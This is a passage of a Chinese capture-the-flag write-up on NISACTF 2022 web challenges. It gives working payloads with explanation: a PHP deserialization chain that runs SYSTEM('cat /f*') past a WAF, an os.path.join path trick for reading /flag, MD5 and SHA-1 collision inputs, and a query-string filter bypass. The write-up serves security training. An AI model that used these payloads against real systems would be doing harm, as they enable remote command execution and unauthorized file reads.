punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//func checkcheck($data)&#123;</span><span class="token comment">//  if(preg_match(......))&#123;</span><span class="token comment">//      die(something wrong);</span><span class="token comment">//  &#125;</span><span class="token comment">//&#125;</span><span class="token comment">//function hint()&#123;</span><span class="token comment">//    echo ".......";</span><span class="token comment">//    die();</span><span class="token comment">//&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终的目的是触发<code>NISA::__invoke</code>魔术方法</p><blockquote><p>__invoke的解释是：直接调用对象名当方法使用时，自动调用</p></blockquote><p>可以通过<code>Ilovetxw::__toString</code>来触发<code>NISA::__invoke</code></p><blockquote><p>__tostring的解释是：将当前类的类名当作变量时自动调用</p></blockquote><p>正常来讲，需要嵌套极长的链来出发，但<code>NISA::__wakeup</code>中的弱比较也可以触发<code>Ilovetxw::__toString</code>，所以有以下exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">NISA</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$txw4ever</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("ls /");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Ilovetxw</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NISA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">fun</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ilovetxw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">-></span><span class="token property">su</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>被checkcheck函数拦截了，返回something wrong</p><p>经过多次尝试大写system可以过waf.php。</p><p>所以最终的exp是：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">NISA</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$txw4ever</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'SYSTEM("cat /f*");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Ilovetxw</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NISA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">fun</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ilovetxw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">-></span><span class="token property">su</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payalod是</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;NISA&quot;:2:&#123;s:8:&quot;txw4ever&quot;;s:18:&quot;SYSTEM(&quot;cat &#x2F;f*&quot;);&quot;;s:3:&quot;fun&quot;;O:8:&quot;Ilovetxw&quot;:1:&#123;s:2:&quot;su&quot;;r:1;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h1><p>打开题目是一个上传页面</p><p><img src="https://imag.keyblue.cn/imag/202309221559382.png" alt="image-20230922155923350"></p><p>查看源码发现隐藏注释</p><p><img src="https://imag.keyblue.cn/imag/202309221600348.png" alt="image-20230922160009311"></p><p>访问<code>/source</code>得到源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> g<span class="token punctuation">,</span> send_from_directory<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> os<span class="token keyword">import</span> uuidapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SCHEMA <span class="token operator">=</span> <span class="token triple-quoted-string string">"""CREATE TABLE files (id text primary key,path text);"""</span><span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    g_db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> g_db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        g_db <span class="token operator">=</span> g<span class="token punctuation">.</span>_database <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> g_db<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_first_request</span><span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>executescript<span class="token punctuation">(</span>SCHEMA<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE html>&lt;html>&lt;body>&lt;form action="/upload" method="post" enctype="multipart/form-data">    Select image to upload:    &lt;input type="file" name="file">    &lt;input type="submit" value="Upload File" name="submit">&lt;/form>&lt;!-- /source -->&lt;/body>&lt;/html>"""</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>directory<span class="token operator">=</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">,</span> path<span class="token operator">=</span><span class="token string">"www.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token string">"."</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Bad filename!"</span><span class="token punctuation">,</span> <span class="token number">403</span>    conn <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    uid <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"insert into files (id, path) values (?, ?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uid<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> sqlite3<span class="token punctuation">.</span>IntegrityError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Duplicate file"</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'uploads/'</span> <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/file/'</span> <span class="token operator">+</span> uid<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/file/&lt;id>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select path from files where id=?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"File not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token comment"># print(res[0])</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"uploads/"</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>意思是上传文件后为文件生成uid，并将文件路径与uid绑定保存到数据库中，访问uid即可访问到文件</p><p>但是这里涉及到os.path.join的漏洞</p><blockquote><p><strong>绝对路径拼接漏洞</strong></p><p>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</p><p>然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 &#x2F; 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</p></blockquote><p>文件不能有后缀</p><p>根据这个漏洞，我们上传的文件名加上<code>/</code>就可以访问文件，于是上传<code>/flag</code>文件</p><p><img src="https://imag.keyblue.cn/imag/202309221608592.png" alt="image-20230922160845551"></p><p><img src="https://imag.keyblue.cn/imag/202309221609139.png" alt="image-20230922160948117"></p><p>end</p><h1 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h1><p>打开题目啥也没有，源代码也没有提示</p><p>kali dirb目录扫描，扫到了<code>robots.txt</code>，里面有<code>level_2_1s_h3re.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//here is level 2</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"str.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$a2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a1</span> <span class="token operator">==</span> <span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"????"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$level3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"level 2 failed ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>md5强比较，而且不能用数组，使用两个md5值相等的字符串</p><pre class="line-numbers language-none"><code class="language-none">array1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2array2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>需要注意的是，使用浏览器直接发送似乎有编码问题，建议使用burp构造发送</p><p><img src="https://imag.keyblue.cn/imag/202309222049944.png" alt="image-20230922204944907"></p><p>访问Level___3.php，变成了sha1值强比较</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//here is level 3</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"str.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$a2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a1</span> <span class="token operator">==</span> <span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"????"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$level4</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"level 3 failed ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两个sha1值完全相同的字符串</p><pre class="line-numbers language-none"><code class="language-none">array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用burp提交</p><p><img src="https://imag.keyblue.cn/imag/202309222056645.png" alt="image-20230922205623612"></p><p>访问level_level_4.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//here is last level</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"str.php"</span><span class="token punctuation">;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"give me a parameter"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |_|20|5f|2e|\./'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"blacklist here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NI_SA_'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"txw4ever"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$level5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"level 4 failed ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先了解一下<code>parse_url()</code>函数</p><blockquote><p>parse_url()</p><p>本函数解析URL并返回关联数组，包含在URL中出现的各种组成部分。数组的元素值<em>不会</em> URL解码。   </p><p>本函数<strong>不是</strong>用来验证给定URL的有效性的，只是将其分解为下面列出的部分。也会接受不完整或无效的 URL，<strong>parse_url()</strong> 会尝试尽量正确解析。 </p><p>返回数组的键<code>query</code>对应的元素是在问号?之后的值</p></blockquote><p>再了解一下<code>$_SERVER[&#39;REQUEST_URI&#39;]</code></p><blockquote><p>访问的url：http:&#x2F;127.0.0.1&#x2F;index.php?a&#x3D;1</p><p>$_SERVER[‘REQUEST_URI’]返回&#x2F;index.php?a&#x3D;1</p></blockquote><p>正则过滤了<code>空格</code>、<code>_</code>、<code>.</code>，但是在php中<code>[</code>、<code>空格</code>、<code>+</code> 、<code>.</code> 这四个都可以被处理为<code>_</code>，<code>+</code>没有过滤</p><pre class="line-numbers language-none"><code class="language-none">NI+SA+&#x3D;txw4ever<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提交返回55_5_55.php，源码审计</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//sorry , here is true last level</span><span class="token comment">//^_^</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"str.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token 